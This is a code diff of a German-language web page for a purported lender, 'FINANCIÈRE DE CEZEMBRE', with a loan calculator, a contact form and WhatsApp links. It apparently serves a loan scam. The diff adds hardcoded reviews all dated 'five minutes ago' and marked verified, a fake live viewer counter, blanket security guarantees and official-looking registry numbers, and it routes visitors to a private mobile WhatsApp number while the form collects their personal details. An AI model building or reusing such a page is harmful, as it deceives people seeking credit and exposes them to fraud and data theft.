@@ -72,20 +72,22 @@
             max-width: 600px; 
             position: relative;
             z-index: 1;
+            padding: 20px;
+            background: radial-gradient(circle at center, rgba(197, 160, 89, 0.2) 0%, transparent 70%);
+            border-radius: 50%;
         }
         .hero-content h1 { font-size: 3.5rem; line-height: 1.2; margin-bottom: 20px; }
         
-        /* SIMULATEUR COMPACT */
         .simulator { 
-            background: var(--white); padding: 30px; border-radius: 4px; width: 450px; 
+            background: var(--white); padding: 40px; border-radius: 2px; width: 480px; 
             box-shadow: 0 30px 60px rgba(0,0,0,0.4); color: var(--navy); 
-            position: relative; overflow: hidden; min-height: 480px;
+            position: relative; overflow: hidden; min-height: 520px;
         }
 
         .btn-group-flex {
             display: flex;
             gap: 10px;
-            margin-top: 15px;
+            margin-top: 10px;
         }
         .btn-wa-inline {
             background: var(--whatsapp);
@@ -94,97 +96,146 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            padding: 0 15px;
+            padding: 0 20px;
             border-radius: 4px;
-            font-size: 1.4rem;
+            font-size: 1.5rem;
             transition: 0.3s;
-            flex: 0 0 60px;
-            height: 60px;
+            flex: 1;
         }
         .btn-wa-inline:hover { background: #128C7E; transform: scale(1.05); }
-
-        /* COMPTEUR LIVE AJUSTÉ */
-        .live-counter { 
-            font-size: 0.8rem; 
-            font-weight: 700; 
-            color: var(--success); 
-            margin-bottom: 15px; 
-            display: flex; 
-            align-items: center; 
-            gap: 10px;
-        }
-        .dot-live { 
-            width: 12px; 
-            height: 12px; 
-            background: #3498db; /* Bleu comme sur la capture */
-            border-radius: 50%; 
-            display: inline-block;
-            animation: pulse-blue 2s infinite;
-        }
-        @keyframes pulse-blue {
-            0% { transform: scale(0.9); box-shadow: 0 0 0 0 rgba(52, 152, 219, 0.7); }
-            70% { transform: scale(1); box-shadow: 0 0 0 10px rgba(52, 152, 219, 0); }
-            100% { transform: scale(0.9); box-shadow: 0 0 0 0 rgba(52, 152, 219, 0); }
-        }
 
         @media (max-width: 991px) {
             .hero { flex-direction: column; height: auto; padding: 120px 5% 50px; text-align: center; }
             .hero-content { max-width: 100%; margin-bottom: 40px; }
             .hero-content h1 { font-size: 2.2rem; }
-            .simulator { width: 100%; max-width: 420px; padding: 20px; min-height: auto; }
+            .simulator { width: 100%; max-width: 480px; padding: 25px; }
+            .stats-bar { flex-direction: column; gap: 30px; }
+            .f-grid, .legal-block { margin-left: 0 !important; text-align: center; }
             .f-grid { grid-template-columns: 1fr; }
-            .reviews-grid { grid-template-columns: 1fr !important; }
+            .reviews-grid { grid-template-columns: 1fr !important; padding: 20px !important; }
+            footer { padding-bottom: 160px !important; } 
+            .wa-assistant-container { bottom: 15px; left: 15px; }
+            .wa-msg-bubble { font-size: 0.6rem; padding: 5px 10px; margin-bottom: 10px; }
+            .whatsapp-float-dynamic { width: 52px; height: 52px; font-size: 28px; }
         }
 
         .reviews-section { padding: 80px 8%; background: var(--light-bg); text-align: center; }
-        .reviews-section h2 { color: var(--navy); margin-bottom: 40px; font-size: 2rem; }
-        .reviews-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 25px; }
-        .review-card { background: white; padding: 25px; border-radius: 8px; box-shadow: 0 10px 20px rgba(0,0,0,0.05); text-align: left; border-top: 3px solid var(--gold); }
-        .stars { color: var(--bright-gold); margin-bottom: 5px; font-size: 0.9rem; }
-        .review-text { font-style: italic; font-size: 0.9rem; color: #555; margin-bottom: 15px; }
-        .review-author { font-weight: 700; color: var(--navy); font-size: 0.85rem; }
+        .reviews-section h2 { color: var(--navy); margin-bottom: 20px; font-size: 2rem; }
+        
+        .trust-badge-container {
+            display: inline-flex; align-items: center; justify-content: center;
+            background: white; padding: 12px 30px; border-radius: 50px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.05); border: 1px solid rgba(197, 160, 89, 0.3);
+            margin-bottom: 40px;
+        }
+        .trust-stars { color: var(--bright-gold); font-size: 1.1rem; letter-spacing: 3px; }
+        .trust-lock { 
+            color: var(--gold); font-size: 1.6rem; margin: 0 20px;
+            animation: pulse-lock 3s infinite ease-in-out; 
+        }
+        @keyframes pulse-lock {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.15); opacity: 0.8; }
+        }
 
-        .sim-row { margin-bottom: 15px; }
-        .sim-row label { display: flex; justify-content: space-between; font-weight: 600; margin-bottom: 8px; font-size: 0.85rem; }
+        .reviews-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 25px; }
+        
+        .review-card { 
+            background: white; padding: 25px; border-radius: 8px; 
+            box-shadow: 0 10px 20px rgba(0,0,0,0.05); text-align: left; 
+            border-top: 3px solid var(--gold); transition: all 0.4s ease;
+        }
+        .review-card:hover { 
+            transform: translateY(-5px); box-shadow: 0 15px 30px rgba(197, 160, 89, 0.2); 
+        }
+
+        .stars { color: var(--bright-gold); margin-bottom: 5px; font-size: 0.9rem; }
+        .review-date { font-size: 0.7rem; color: #999; margin-bottom: 10px; font-weight: 600; display: block; }
+        .review-text { font-style: italic; font-size: 0.9rem; color: #555; margin-bottom: 15px; line-height: 1.6; min-height: 60px; }
+        .review-author { font-weight: 700; color: var(--navy); font-size: 0.85rem; display: flex; align-items: center; justify-content: space-between; }
+        .verified { color: var(--success); font-size: 0.7rem; text-transform: uppercase; font-weight: 800; }
+
+        .sim-row { margin-bottom: 20px; }
+        .sim-row label { display: flex; justify-content: space-between; font-weight: 600; margin-bottom: 10px; font-size: 0.9rem; }
+        .sim-row label span { color: var(--navy); font-weight: 800; } 
         
         input[type="range"] { 
-            -webkit-appearance: none; width: 100%; height: 6px; background: #ddd; border-radius: 5px; outline: none;
-            background-image: linear-gradient(var(--gold), var(--gold)); background-repeat: no-repeat; background-size: 0% 100%;
+            -webkit-appearance: none; width: 100%; height: 5px; background: #ddd; border-radius: 5px; outline: none;
+            background-image: linear-gradient(var(--bright-gold), var(--bright-gold));
+            background-repeat: no-repeat; background-size: 0% 100%;
         }
-        input[type="range"]::-webkit-slider-thumb { -webkit-appearance: none; height: 20px; width: 20px; border-radius: 50%; background: var(--navy); cursor: pointer; border: 2px solid white; }
-
-        /* ZONE RESULTAT RÉDUITE */
-        .result-area { 
-            background: #F8FAFC; padding: 15px; text-align: center; 
-            border: 1px dashed #cbd5e1; margin: 15px 0; border-radius: 4px; 
+        input[type="range"]::-webkit-slider-thumb { 
+            -webkit-appearance: none; height: 22px; width: 22px; border-radius: 50%; 
+            background: var(--navy); cursor: pointer; border: 2px solid white; box-shadow: 0 0 5px rgba(0,0,0,0.3);
         }
-        .result-area p { font-size: 0.75rem; margin-bottom: 5px; color: #64748b; font-weight: 600; text-transform: uppercase; }
+        input[type="range"]::-moz-range-thumb { 
+            height: 22px; width: 22px; border-radius: 50%; background: var(--navy); cursor: pointer; border: 2px solid white; 
+        }
+        
+        .result-area { background: var(--light-bg); padding: 20px; text-align: center; border: 1px solid #EEE; margin-bottom: 20px; border-radius: 4px; }
+        .result-area p { font-size: 0.75rem; margin-bottom: 5px; color: var(--navy); font-weight: 800; text-transform: uppercase; letter-spacing: 0.5px; }
         .result-area span { font-size: 1.8rem; font-weight: 800; color: var(--navy); }
         
-        .btn-main { 
-            background: var(--navy); color: white; border: none; width: 100%; height: 60px;
-            font-weight: 800; font-size: 1rem; cursor: pointer; transition: 0.3s; border-radius: 4px; 
-        }
-        .btn-main:hover { background: #002a7a; }
+        .btn-main { background: var(--navy); color: white; border: none; width: 100%; padding: 25px; font-weight: 800; font-size: 1.1rem; cursor: pointer; transition: 0.3s; border-radius: 4px; }
+        .btn-main:hover { background: var(--gold); transform: scale(1.02); }
 
-        .form-input { width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 4px; margin-bottom: 10px; outline: none; }
-        .security-tag { text-align: center; margin-top: 15px; font-size: 0.7rem; color: #27ae60; font-weight: 600; }
+        .form-input { 
+            width: 100%; padding: 12px; border: 2.5px solid var(--deep-gold); 
+            background-color: var(--white); border-radius: 4px; margin-bottom: 10px; 
+            font-size: 1rem; outline: none; color: #000c24; font-weight: 600; 
+        }
+        .form-input:focus { border-color: var(--navy); background-color: #fffef0; }
+
+        .security-tag { text-align: center; margin-top: 15px; font-size: 0.7rem; color: #27ae60; font-weight: 600; text-transform: uppercase; }
 
         .scrolling-security {
-            background: #f1f5f9; font-size: 0.65rem; padding: 5px 0; margin-top: 10px;
-            overflow: hidden; white-space: nowrap; display: flex;
+            background: #f0f4f8; color: #004085; font-size: 0.7rem; padding: 8px 0; margin: 10px 0;
+            overflow: hidden; white-space: nowrap; border-top: 1px solid #d1ecf1; border-bottom: 1px solid #d1ecf1;
+            display: flex;
         }
-        .scrolling-security span { display: inline-block; padding-left: 100%; animation: scroll-text 20s linear infinite; }
+        .scrolling-security span {
+            display: inline-block; padding-left: 100%; animation: scroll-text 30s linear infinite; font-weight: 600;
+        }
         @keyframes scroll-text { 0% { transform: translate(0, 0); } 100% { transform: translate(-100%, 0); } }
 
         .stats-bar { background: var(--navy); padding: 40px 8%; display: flex; justify-content: space-around; color: white; text-align: center; }
-        .stat-box h3 { font-size: 1.8rem; color: var(--gold); }
+        .stat-box h3 { font-size: 2rem; color: var(--gold); }
 
-        footer { background: #0A0A0A; color: #888; padding: 60px 8%; font-size: 0.8rem; }
-        .f-grid { display: grid; grid-template-columns: 2fr 1fr 1fr 1fr; gap: 40px; margin-bottom: 40px; }
-        .tag-warning { border: 1px solid #333; padding: 15px; margin-top: 20px; color: #AAA; text-align: center; }
+        .about-section { padding: 100px 15%; line-height: 2; text-align: justify; background: var(--white); }
+        .about-section h2 { margin-bottom: 30px; color: var(--navy); text-align: center; }
 
-        #goUp { position: fixed; bottom: 30px; right: 30px; background: var(--gold); color: white; width: 45px; height: 45px; border-radius: 50%; display: none; align-items: center; justify-content: center; cursor: pointer; }
+        footer { background: #0A0A0A; color: #888; padding: 80px 8% 40px; font-size: 0.8rem; }
+        .f-grid, .legal-block { margin-left: 160px; }
+        .f-grid { display: grid; grid-template-columns: 2fr 1fr 1fr 1fr; gap: 50px; margin-bottom: 50px; }
+        .legal-block { border-top: 1px solid #222; padding-top: 40px; line-height: 1.8; }
+        .tag-warning { border: 1px solid #444; padding: 15px; margin-top: 20px; color: #AAA; text-align: center; }
+
+        .wa-assistant-container { position: fixed; bottom: 30px; left: 30px; z-index: 9999; display: flex; flex-direction: column; align-items: center; }
+        .wa-msg-bubble { background: var(--navy); color: white; padding: 10px 15px; border-radius: 12px; font-size: 0.75rem; font-weight: 600; margin-bottom: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.3); border: 1px solid var(--gold); position: relative; animation: fadeInOut 4s infinite; white-space: nowrap; }
+        .whatsapp-float-dynamic { background-color: var(--whatsapp); color: #FFF; width: 65px; height: 65px; border-radius: 50%; text-align: center; font-size: 35px; display: flex; align-items: center; justify-content: center; text-decoration: none; animation: magnet-pulse 2s infinite ease-in-out; }
+        
+        #goUp { position: fixed; bottom: 30px; right: 30px; background: var(--gold); color: white; width: 45px; height: 45px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; display: none; }
+        
+        /* STYLE DU COMPTEUR VERT ALIGNÉ */
+        .live-counter { 
+            font-size: 0.85rem; 
+            font-weight: 800; 
+            color: var(--success); 
+            margin-bottom: 20px; 
+            display: flex; 
+            align-items: center; 
+            gap: 10px;
+            animation: pulse-live 2s infinite;
+        }
+        .dot-live { 
+            width: 12px; 
+            height: 12px; 
+            background: var(--success); 
+            border-radius: 50%; 
+            display: inline-block;
+            box-shadow: 0 0 8px var(--success);
+        }
+        @keyframes pulse-live { 0% { opacity: 1; } 50% { opacity: 0.6; } 100% { opacity: 1; } }
     </style>
 </head>
 <body>
@@ -198,28 +249,33 @@
         <a href="#about">Expertise</a>
         <a href="#legal">Gouvernance</a>
         <a onclick="goToStep1()" href="#simBox">Kontakt</a>
-        <div class="intl-badge"><i class="fas fa-globe"></i> SICHERES PORTAL</div>
+        <div class="intl-badge"><i class="fas fa-globe"></i> SICHERES INTERNATIONALES PORTAL</div>
     </div>
 </header>
+
+<div class="wa-assistant-container">
+    <div class="wa-msg-bubble"><span id="wa-text">Brauchen Sie Hilfe?</span></div>
+    <a href="https://wa.me/33780976404" class="whatsapp-float-dynamic" target="_blank"><i class="fab fa-whatsapp"></i></a>
+</div>
 
 <section class="hero">
     <div class="hero-content">
         <h1>Finanzielle Exzellenz <br>für Ihre Projekte.</h1>
-        <p style="margin-bottom: 30px; opacity: 0.8;">Zuverlässiger Partner seit 1990. Regulierte institutionelle Kreditvergabe.</p>
+        <p style="margin-bottom: 30px; opacity: 0.9;">Zuverlässiger Partner seit 1990. Regulierte institutionelle Kreditvergabe.</p>
         
         <div style="display: flex; gap: 20px; align-items: center;">
-            <i class="fas fa-certificate" style="color: #FFD700; font-size: 3rem;"></i>
-            <p style="font-size: 0.85rem;">
-                <strong>ZUGELASSENES INSTITUT</strong><br>
-                Eingetragen unter RCS 552 058 943
+            <i class="fas fa-certificate" style="color: #FFD700; font-size: 3.5rem;"></i>
+            <p>
+                <strong style="color: #FFD700; font-size: 0.9rem; letter-spacing: 1px;">ZUGELASSENES INSTITUT</strong><br>
+                <strong>Eingetragen unter RCS 552 058 943</strong>
             </p>
         </div>
     </div>
 
     <div class="simulator" id="simBox">
-        <div id="loader-overlay" style="display:none; position:absolute; inset:0; background:white; z-index:10; flex-direction:column; align-items:center; justify-content:center;">
-            <div style="width:40px; height:40px; border:4px solid #f3f3f3; border-top:4px solid var(--navy); border-radius:50%; animation:spin 1s linear infinite;"></div>
-            <p style="margin-top:15px; font-weight:600;">Verarbeitung...</p>
+        <div id="loader-overlay" style="display:none; position:absolute; inset:0; background:white; z-index:100; flex-direction:column; align-items:center; justify-content:center;">
+            <div class="spinner"></div>
+            <p style="font-weight:600;">Analyse läuft...</p>
         </div>
 
         <div id="step1">
@@ -228,34 +284,32 @@
                 12 Personen schauen sich dieses Angebot gerade an
             </div>
             
-            <h3 style="margin-bottom: 15px; font-size: 1.1rem;">Kreditrechner</h3>
-            
+            <h3 style="margin-bottom: 20px;">Kreditrechner</h3>
             <div class="sim-row">
-                <label>PROJEKTBETRAG <span><input type="number" id="amtNum" value="15000" style="border:none; text-align:right; font-weight:800; width:70px; color:var(--navy); outline:none;"> €</span></label>
+                <label>PROJEKTBETRAG <span><input type="number" id="amtNum" value="15000" style="border:none; text-align:right; font-weight:800; width:80px; background:transparent; color: var(--navy);"> €</span></label>
                 <input type="range" id="amtRange" min="1000" max="75000" step="500" value="15000">
             </div>
-            
             <div class="sim-row">
                 <label>LAUFZEIT <span id="durText" style="color: var(--navy); font-weight: 800;">36 Monate</span></label>
                 <input type="range" id="durRange" min="6" max="84" step="6" value="36">
             </div>
-
+            
             <div class="result-area">
-                <p>MONATSRATE (3.5% FESTZINS)</p>
-                <span id="monthlyRes">0.00</span> <small style="font-weight:800; font-size:1rem;">€</small>
+                <p>GESCHÄTZTE MONATSRATE (3.5% FESTZINS)</p>
+                <span id="monthlyRes">0.00</span> <span style="font-size:1.2rem; color: var(--navy); font-weight: 800;">€</span>
             </div>
 
             <div class="btn-group-flex">
-                <button type="button" class="btn-main" onclick="goToStep2()">MEINEN ANTRAG STELLEN</button>
-                <a href="https://wa.me/33780976404" class="btn-wa-inline" target="_blank">
+                <button type="button" class="btn-main" style="flex: 4;" onclick="goToStep2()">MEINEN ANTRAG STELLEN</button>
+                <a href="https://wa.me/33780976404" class="btn-wa-inline">
                     <i class="fab fa-whatsapp"></i>
                 </a>
             </div>
             
             <div class="scrolling-security">
-                <span><i class="fas fa-lock"></i> 256-Bit-SSL-Verschlüsselung • Garantierter Datenschutz • Sichere Übertragung</span>
+                <span><i class="fas fa-lock"></i> 256-Bit-SSL-Verschlüsselung • Garantierter Schutz • Ihre Daten sind streng vertraulich.</span>
             </div>
-            <div class="security-tag"><i class="fas fa-shield-alt"></i> IHR DOSSIER IST 100% SICHER</div>
+            <div class="security-tag"><i class="fas fa-lock"></i> IHR DOSSIER IST 100% SICHER</div>
         </div>
 
         <div id="step2" style="display:none;">
@@ -263,48 +317,60 @@
             <form id="loanForm">
                 <input type="hidden" name="access_key" value="55707e6c-f919-4972-bf3e-fba1cf0e51e9">
                 <input type="text" name="nom" placeholder="Vor- und Nachname" class="form-input" required>
+                <select name="projet" class="form-input" required>
+                    <option value="" disabled selected>Wählen Sie Ihr Projekt</option>
+                    <option value="Immobilier">Immobilienkredit</option>
+                    <option value="Personnel">Privatkredit</option>
+                    <option value="Auto">Auto / Motorrad</option>
+                </select>
+                <input type="tel" name="telephone" placeholder="Telefonnummer" class="form-input" required>
                 <input type="email" name="email" placeholder="E-Mail-Adresse" class="form-input" required>
-                <input type="tel" name="phone" placeholder="Telefonnummer" class="form-input" required>
-                <button type="submit" class="btn-main">ABSENDEN</button>
-                <p onclick="goToStep1()" style="text-align:center; margin-top:15px; cursor:pointer; font-size:0.8rem; text-decoration:underline;">Zurück</p>
+                <button type="submit" class="btn-main">ABSENDEN BESTÄTIGEN</button>
+                <p onclick="goToStep1()" style="text-align:center; margin-top:15px; cursor:pointer; font-size:0.8rem; text-decoration:underline;">Zurück zum Rechner</p>
             </form>
         </div>
     </div>
 </section>
 
 <section class="stats-bar">
-    <div class="stat-box"><h3>1.2M €</h3><p>Grundkapital</p></div>
-    <div class="stat-box"><h3>3.5%</h3><p>Zinssatz</p></div>
-    <div class="stat-box"><h3>24h</h3><p>Reaktion</p></div>
+    <div class="stat-box"><h3>1 200 000 €</h3><p>Grundkapital</p></div>
+    <div class="stat-box"><h3>3.5%</h3><p>Vorzugszinssatz</p></div>
+    <div class="stat-box"><h3>100%</h3><p>Digital & Sicher</p></div>
 </section>
 
 <section class="reviews-section">
-    <h2>Kundenbewertungen</h2>
+    <h2>Vertrauen unserer internationalen Kunden</h2>
+    <div class="trust-badge-container">
+        <div class="trust-stars"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div>
+        <div class="trust-lock"><i class="fas fa-lock"></i></div>
+        <div class="trust-stars"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div>
+    </div>
     <div class="reviews-grid" id="reviews-container"></div>
 </section>
 
 <section class="about-section" id="about">
-    <div style="max-width: 800px; margin: 0 auto; text-align: center;">
-        <h2>Eine Referenzinstitution</h2>
-        <p>FINANCIÈRE DE CEZEMBRE mit Sitz in Ergué-Gabéric est une führende Aktiengesellschaft im Bereich der Kreditvergabe. Mit einem Grundkapital von 1.200.000 Euro gewährleisten wir eine sichere Finanzierung für Privatpersonen und Profis.</p>
-    </div>
+    <h2>Eine Referenzinstitution</h2>
+    <p>FINANCIÈRE DE CEZEMBRE mit Sitz in Ergué-Gabéric (29500) est une führende Aktiengesellschaft im Bereich der Kreditvergabe. Mit einem Grundkapital von 1.200.000 Euro gewährleisten wir eine sichere Finanzierung für Privatpersonen und Profis.</p>
 </section>
 
 <footer id="legal">
     <div class="f-grid">
-        <div><h4>FINANCIÈRE DE CEZEMBRE</h4><p>Regulierte Kreditverteilung.<br>RCS 552 058 943</p></div>
+        <div><h4>FINANCIÈRE DE CEZEMBRE</h4><p>Regulierte Kreditverteilung.<br>LEI : 969500WONJGTDZG8E035</p></div>
         <div><h4>HAUPTSITZ</h4><p>ODET, 29500<br>ERGUÉ-GABÉRIC, Frankreich</p></div>
     </div>
-    <div class="tag-warning">EIN KREDIT VERPFLICHTET SIE UND MUSS ZURÜCKGEZAHLT WERDEN.</div>
+    <div class="legal-block">
+        <div class="tag-warning">EIN KREDIT VERPFLICHTET SIE UND MUSS ZURÜCKGEZAHLT WERDEN.</div>
+    </div>
 </footer>
 
 <div id="goUp" onclick="window.scrollTo({top:0, behavior:'smooth'})"><i class="fas fa-arrow-up"></i></div>
 
 <script>
     const reviews = [
-        { n: "Marc L.", p: "Frankreich", t: "Financement rapide et équipe très professionnelle." },
-        { n: "Lars O.", p: "Deutschland", t: "Sehr zufrieden mit dem Zinssatz und der Abwicklung." },
-        { n: "Thomas W.", p: "Luxemburg", t: "Etablissement sérieux et réactif." }
+        { n: "Marc L.", p: "France", t: "Financement rapide et équipe très professionnelle." },
+        { n: "Lars O.", p: "Germany", t: "Sehr zufrieden mit dem Zinssatz und der Abwicklung." },
+        { n: "Thomas W.", p: "Luxembourg", t: "Etablissement sérieux et réactif." },
+        { n: "Sophie D.", p: "Belgique", t: "Efficace et sécurisé. Une aide précieuse." }
     ];
 
     function renderReviews() {
@@ -312,9 +378,10 @@
         reviews.forEach(r => {
             container.innerHTML += `
                 <div class="review-card">
+                    <span class="review-date">Vor 5 Minuten</span>
                     <div class="stars"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div>
                     <p class="review-text">"${r.t}"</p>
-                    <p class="review-author">${r.n} (${r.p})</p>
+                    <div class="review-author">${r.n} (${r.p}) <span class="verified"><i class="fas fa-check-circle"></i> VERIFIZIERT</span></div>
                 </div>`;
         });
     }
@@ -327,27 +394,20 @@
     const resM = document.getElementById('monthlyRes');
 
     function calc() {
-        let p = parseFloat(amtR.value); 
-        let n = parseInt(durR.value); 
-        let r = 0.035 / 12;
-        amtN.value = p; 
-        durT.innerText = n + " Monate";
+        let p = parseFloat(amtR.value); let n = parseInt(durR.value); let r = 0.035 / 12;
+        amtN.value = p; durT.innerText = n + " Monate";
         let m = (p * r) / (1 - Math.pow(1 + r, -n));
         resM.innerText = m.toLocaleString('de-DE', {minimumFractionDigits: 2, maximumFractionDigits: 2});
-        
         let valA = (amtR.value - amtR.min) / (amtR.max - amtR.min) * 100;
         amtR.style.backgroundSize = valA + '% 100%';
         let valD = (durR.value - durR.min) / (durR.max - durR.min) * 100;
         durR.style.backgroundSize = valD + '% 100%';
     }
 
-    amtR.oninput = calc; 
-    durR.oninput = calc;
-    amtN.onchange = () => { amtR.value = amtN.value; calc(); };
-
     function goToStep2() { document.getElementById('step1').style.display = 'none'; document.getElementById('step2').style.display = 'block'; }
     function goToStep1() { document.getElementById('step2').style.display = 'none'; document.getElementById('step1').style.display = 'block'; }
 
+    amtR.oninput = calc; durR.oninput = calc;
     window.onscroll = () => { document.getElementById('goUp').style.display = (window.scrollY > 500) ? 'flex' : 'none'; };
     calc();
 
@@ -356,7 +416,7 @@
         document.getElementById('loader-overlay').style.display = 'flex';
         const formData = new FormData(e.target);
         await fetch('https://api.web3forms.com/submit', { method: 'POST', body: formData });
-        alert("Anfrage gesendet!");
+        alert("Antrag gesendet!");
         location.reload();
     };
 </script>
